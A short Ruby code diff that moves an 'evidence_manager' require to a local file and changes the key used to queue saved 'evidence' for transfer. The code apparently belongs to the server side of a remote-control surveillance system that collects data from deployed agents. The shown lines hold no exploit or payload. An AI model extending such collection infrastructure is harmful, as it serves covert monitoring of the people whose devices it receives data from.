@@ -6,11 +6,11 @@
 require_relative 'db.rb'
 require_relative 'sessions.rb'
 require_relative 'evidence_transfer.rb'
+require_relative 'evidence_manager.rb'
 
 # from RCS::Common
 require 'rcs-common/trace'
 require 'rcs-common/pascalize'
-require 'rcs-common/evidence_manager'
 
 # system
 
@@ -300,7 +300,7 @@ module Commands
       session[:count] += 1
 
       # notify the transfer manager that an evidence is available
-      EvidenceTransfer.instance.queue session[:instance], id
+      EvidenceTransfer.instance.queue "#{session[:ident]}_#{session[:instance]}", id
 
       trace :info, "[#{peer}][#{session[:cookie]}] Evidence saved (#{size} bytes) - #{session[:count]}"
     rescue Exception => e
